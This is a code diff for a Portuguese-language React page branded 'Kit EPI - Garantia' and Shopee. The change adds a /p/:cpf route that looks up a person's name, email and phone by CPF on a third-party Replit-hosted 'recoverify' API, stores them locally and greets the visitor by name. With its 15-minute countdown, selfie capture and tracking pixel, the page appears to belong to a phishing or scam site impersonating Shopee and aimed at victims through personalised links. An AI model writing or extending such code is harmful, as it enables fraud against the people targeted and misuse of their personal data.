@@ -1,7 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { addDays, format } from 'date-fns';
 import { ptBR } from 'date-fns/locale';
-import { useLocation } from 'wouter';
+import { useLocation, useRoute } from 'wouter';
 
 import Header from '@/components/Header';
 import Footer from '@/components/Footer';
@@ -26,20 +26,109 @@ interface DadosUsuario {
 
 const Epi: React.FC = () => {
   const [, setLocation] = useLocation();
+  const [match, params] = useRoute('/p/:cpf');
   useScrollTop();
   
   const [dadosUsuario, setDadosUsuario] = useState<DadosUsuario | null>(null);
   const [dataEntrega, setDataEntrega] = useState<string>('');
   const [selfieImage, setSelfieImage] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
+  const [isLoadingCpf, setIsLoadingCpf] = useState(false);
   const [timeLeft, setTimeLeft] = useState<number>(900); // 15 minutos em segundos
   const { toast } = useToast();
+
+  // Função para buscar dados do CPF na API
+  const fetchCpfData = async (cpf: string) => {
+    try {
+      setIsLoadingCpf(true);
+      console.log(`[EPI] Buscando dados para CPF: ${cpf}`);
+      
+      const apiUrl = `https://recoverify1.replit.app/api/v1/cliente/cpf/${cpf}`;
+      
+      const response = await fetch(apiUrl, {
+        method: 'GET',
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        }
+      });
+      
+      if (response.ok) {
+        const data = await response.json();
+        console.log('[EPI] Dados recebidos:', data);
+        
+        if (data.sucesso && data.cliente) {
+          const cliente = data.cliente;
+          
+          // Salvar dados no localStorage
+          const userData = {
+            nome: cliente.nome,
+            cpf: cliente.cpf,
+            email: cliente.email,
+            telefone: cliente.telefone,
+            id: cliente.id,
+            data_cadastro: cliente.data_cadastro
+          };
+          
+          localStorage.setItem('candidato_data', JSON.stringify(userData));
+          localStorage.setItem('user_name', cliente.nome);
+          localStorage.setItem('user_cpf', cliente.cpf);
+          localStorage.setItem('user_data', JSON.stringify(userData));
+          
+          console.log('[EPI] Dados salvos no localStorage');
+          
+          // Definir os dados no estado
+          setDadosUsuario({
+            nome: cliente.nome,
+            cpf: cliente.cpf,
+            email: cliente.email,
+            telefone: cliente.telefone
+          });
+          
+          toast({
+            title: "Dados carregados!",
+            description: `Olá ${cliente.nome}, seus dados foram carregados com sucesso.`,
+          });
+        } else {
+          toast({
+            title: "CPF não encontrado",
+            description: "Não encontramos seus dados. Você será redirecionado para o cadastro.",
+            variant: "destructive",
+          });
+          setTimeout(() => {
+            setLocation('/');
+          }, 3000);
+        }
+      } else {
+        throw new Error('Erro ao consultar CPF');
+      }
+    } catch (error) {
+      console.error('[EPI] Erro ao buscar dados:', error);
+      toast({
+        title: "Erro ao carregar dados",
+        description: "Não foi possível carregar seus dados. Você será redirecionado.",
+        variant: "destructive",
+      });
+      setTimeout(() => {
+        setLocation('/');
+      }, 3000);
+    } finally {
+      setIsLoadingCpf(false);
+    }
+  };
 
   // Inicializar o Facebook Pixel e carregar dados
   useEffect(() => {
     initFacebookPixel();
     
-    // Recuperar dados do usuário
+    // Se acessou via /p/:cpf, buscar dados da API
+    if (match && params?.cpf) {
+      console.log('[EPI] Acessado via /p/:cpf, buscando dados na API...');
+      fetchCpfData(params.cpf);
+      return; // Não continuar com carregamento do localStorage
+    }
+    
+    // Caso contrário, carregar do localStorage (comportamento original)
     let nomeUsuario = '';
     let cpfUsuario = '';
     let emailUsuario = '';
@@ -97,7 +186,7 @@ const Epi: React.FC = () => {
     const dataEntregaObj = addDays(hoje, 5);
     const dataFormatada = format(dataEntregaObj, "EEEE, dd/MM/yyyy", { locale: ptBR });
     setDataEntrega(dataFormatada.charAt(0).toUpperCase() + dataFormatada.slice(1));
-  }, []);
+  }, [match, params]);
 
   // Timer de 15 minutos
   useEffect(() => {
@@ -202,6 +291,39 @@ const Epi: React.FC = () => {
     }
   };
 
+  // Mostrar loading enquanto busca dados da API
+  if (isLoadingCpf) {
+    return (
+      <div className="bg-white min-h-screen flex flex-col">
+        <Header />
+        
+        <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
+          <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
+          
+          <div className="flex items-center relative z-10">
+            <div className="text-white mr-3">
+              <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
+            </div>
+            <div className="leading-none">
+              <h1 className="text-base font-bold text-white mb-0">Kit EPI - Garantia</h1>
+              <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
+            </div>
+          </div>
+        </div>
+        
+        <div className="flex-grow container mx-auto px-4 py-8 flex items-center justify-center">
+          <div className="text-center">
+            <Spinner className="w-12 h-12 mx-auto mb-4" />
+            <p className="text-lg text-gray-600">Carregando seus dados...</p>
+            <p className="text-sm text-gray-500 mt-2">Por favor, aguarde.</p>
+          </div>
+        </div>
+        
+        <Footer />
+      </div>
+    );
+  }
+  
   return (
     <div className="bg-white min-h-screen flex flex-col">
       <Header />
